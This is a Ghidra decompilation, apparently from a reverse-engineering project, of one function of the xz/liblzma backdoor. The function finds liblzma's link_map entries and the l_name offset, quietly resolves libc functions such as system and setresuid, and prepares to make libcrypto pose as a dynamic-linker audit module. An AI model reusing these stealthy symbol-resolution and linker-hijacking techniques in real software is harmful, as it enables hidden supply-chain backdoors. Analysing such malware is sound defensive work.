// /home/kali/xzre-ghidra/xzregh/104080_find_link_map_l_name.c
// Function: find_link_map_l_name @ 0x104080
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_link_map_l_name(backdoor_data_handle_t * data_handle, ptrdiff_t * libname_offset, backdoor_hooks_data_t * hooks, imported_funcs_t * imported_funcs)


/*
 * AutoDoc: Walks the liblzma link_map table (pulled from the `.data` copy baked into the object) to find
 * the entry whose RELRO tuple matches the live liblzma image, then computes the displacement of
 * each `link_map::l_name` pointer relative to that snapshot. Along the way it resolves the
 * `_dl_audit_symbind_alt` template, several libc helpers (exit, setresuid/gid, system, shutdown),
 * and caches the displacement so later code can rewrite libcrypto's `l_name` field when posing
 * as an audit module.
 */
#include "xzre_types.h"


BOOL find_link_map_l_name
               (backdoor_data_handle_t *data_handle,ptrdiff_t *libname_offset,
               backdoor_hooks_data_t *hooks,imported_funcs_t *imported_funcs)

{
  libc_imports_t *plVar1;
  elf_info_t *peVar2;
  link_map *plVar3;
  _func_64 *code_start;
  BOOL BVar4;
  uint uVar5;
  lzma_allocator *allocator;
  _func_19 *p_Var6;
  _func_27 *p_Var7;
  _func_20 *p_Var8;
  lzma_allocator *allocator_00;
  Elf64_Sym *pEVar9;
  _func_39 *p_Var10;
  uchar *code_start_00;
  _func_21 *p_Var11;
  _func_22 *p_Var12;
  _func_28 *p_Var13;
  link_map *plVar14;
  link_map *plVar15;
  u64 displacement;
  link_map *plVar16;
  link_map *plVar17;
  link_map *plVar18;
  libc_imports_t *libc_imports;
  elf_info_t *ldso_elf;
  link_map *link_map_cursor;
  _func_64 *audit_stub;
  lzma_allocator *import_allocator;
  u64 local_38;
  
  BVar4 = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0x6c,0x10,5);
  if (BVar4 != FALSE) {
    plVar1 = imported_funcs->libc;
    plVar18 = data_handle->data->liblzma_map;
    allocator = get_lzma_allocator();
    allocator->opaque = data_handle->elf_handles->libc;
    p_Var6 = (_func_19 *)lzma_alloc(0x8a8,allocator);
    plVar1->exit = p_Var6;
    if (p_Var6 != (_func_19 *)0x0) {
      plVar1->resolved_imports_count = plVar1->resolved_imports_count + 1;
    }
    p_Var7 = (_func_27 *)lzma_alloc(0x428,allocator);
    plVar1->setlogmask = p_Var7;
    if (p_Var7 != (_func_27 *)0x0) {
      plVar1->resolved_imports_count = plVar1->resolved_imports_count + 1;
    }
    p_Var8 = (_func_20 *)lzma_alloc(0x5f0,allocator);
    plVar1->setresgid = p_Var8;
    if (p_Var8 != (_func_20 *)0x0) {
      plVar1->resolved_imports_count = plVar1->resolved_imports_count + 1;
    }
    allocator_00 = get_lzma_allocator();
    peVar2 = data_handle->elf_handles->dynamic_linker;
    allocator_00->opaque = data_handle->elf_handles->libcrypto;
    pEVar9 = elf_symbol_get(peVar2,STR_dl_audit_preinit,0);
    if (pEVar9 != (Elf64_Sym *)0x0) {
      p_Var10 = (_func_39 *)lzma_alloc(0x4e0,allocator_00);
      imported_funcs->BN_num_bits = p_Var10;
      if (p_Var10 != (_func_39 *)0x0) {
        imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
      }
      peVar2 = data_handle->elf_handles->dynamic_linker;
      code_start_00 = peVar2->elfbase->e_ident + pEVar9->st_value;
      BVar4 = elf_contains_vaddr(peVar2,code_start_00,pEVar9->st_size,4);
      plVar16 = plVar18 + 0x960;
      if (BVar4 != FALSE) {
LAB_001041f0:
        if (plVar18 != plVar16) {
          peVar2 = data_handle->elf_handles->liblzma;
          if ((*(u64 *)plVar18 != peVar2->gnurelro_vaddr) ||
             (*(u64 *)(plVar18 + 8) != peVar2->gnurelro_memsize)) goto LAB_001041ec;
          plVar14 = (link_map *)0x0;
          plVar15 = (link_map *)0xffffffffffffffff;
          for (plVar16 = data_handle->data->liblzma_map; plVar16 < plVar18 + 0x18;
              plVar16 = plVar16 + 8) {
            plVar3 = *(link_map **)plVar16;
            if (plVar18 + 0x18 <= plVar3) {
              plVar17 = plVar15;
              if (plVar18 + 0x68 <= plVar15) {
                plVar17 = plVar18 + 0x68;
              }
              if (plVar3 < plVar17) {
                plVar14 = plVar16;
                plVar15 = plVar3;
              }
            }
          }
          if (plVar15 != (link_map *)0xffffffffffffffff) {
            allocator->opaque = data_handle->elf_handles->libc;
            p_Var11 = (_func_21 *)lzma_alloc(0xab8,allocator);
            plVar1->setresuid = p_Var11;
            if (p_Var11 != (_func_21 *)0x0) {
              plVar1->resolved_imports_count = plVar1->resolved_imports_count + 1;
            }
            plVar18 = data_handle->data->liblzma_map;
            displacement = (long)plVar15 - (long)plVar18;
            uVar5 = (int)plVar18 - (int)plVar14;
            if (plVar18 <= plVar14) {
              uVar5 = (int)plVar14 - (int)plVar18;
            }
            (hooks->ldso_ctx).libcrypto_l_name = (char **)(data_handle->data->libcrypto_map + uVar5)
            ;
            BVar4 = find_lea_instruction(code_start_00,code_start_00 + pEVar9->st_size,displacement)
            ;
            if (BVar4 == FALSE) {
              return FALSE;
            }
            code_start = (hooks->ldso_ctx)._dl_audit_symbind_alt;
            BVar4 = find_lea_instruction
                              ((u8 *)code_start,
                               (u8 *)(code_start + (hooks->ldso_ctx)._dl_audit_symbind_alt__size),
                               displacement);
            if (BVar4 == FALSE) {
              return FALSE;
            }
            allocator->opaque = data_handle->elf_handles->libc;
            p_Var12 = (_func_22 *)lzma_alloc(0x9f8,allocator);
            plVar1->system = p_Var12;
            if (p_Var12 != (_func_22 *)0x0) {
              plVar1->resolved_imports_count = plVar1->resolved_imports_count + 1;
            }
            p_Var13 = (_func_28 *)lzma_alloc(0x760,allocator);
            plVar1->shutdown = p_Var13;
            if (p_Var13 != (_func_28 *)0x0) {
              plVar1->resolved_imports_count = plVar1->resolved_imports_count + 1;
            }
            allocator_00->opaque = data_handle->elf_handles->libcrypto;
            *libname_offset = displacement;
            return TRUE;
          }
        }
      }
      lzma_free(imported_funcs->BN_num_bits,allocator_00);
    }
  }
  return FALSE;
LAB_001041ec:
  plVar18 = plVar18 + 8;
  goto LAB_001041f0;
}

